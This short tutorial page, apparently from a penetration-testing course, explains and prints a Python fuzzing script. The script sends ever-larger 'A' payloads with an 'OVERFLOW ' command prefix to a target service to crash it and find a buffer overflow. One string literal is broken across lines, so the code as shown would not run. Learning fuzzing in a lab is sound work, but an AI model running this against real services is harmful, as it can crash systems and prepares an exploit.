Python Fuzzing Script

Automating data injection for vulnerability discovery.

This Python script automates sending data to a network service to find buffer overflows.

It defines target IP, port, and a command prefix.

It iteratively sends increasing amounts of 'A' characters, starting from a defined size and incrementing until a maximum size is reached.

A socket connection is established for each payload, and the script monitors for connection errors or timeouts, which indicate a potential crash.

#!/usr/bin/env python3

import socket
import time
import sys

# Target information
IP = "192.168.1.100"  # Replace with your target IP
PORT = 9999           # Replace with your target port
PREFIX = "OVERFLOW " # Command prefix

# Fuzzing parameters
start_size = 100
increment_by = 100
max_size = 5000

print(f"[*] Fuzzing {IP}:{PORT} with prefix '{PREFIX}'")

string = ""
while len(string) < max_size:
    string += "A" * increment_by
    payload = PREFIX + string

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((IP, PORT))
        print(f"[*] Sending payload of size {len(string)} bytes...")
        s.send(bytes(payload + "\r
", "latin-1"))
        s.recv(1024)
        s.close()
        time.sleep(1)
    except socket.error as e:
        print(f"[!] Connection failed or timed out at size {len(string)}: {e}")
        print("[!] The target server likely crashed. Check your debugger!")
        sys.exit(0)

print("[*] Fuzzing completed without a crash.")
Key Takeaway

This Python script automates the fuzzing process by iteratively sending larger payloads to a target network service.
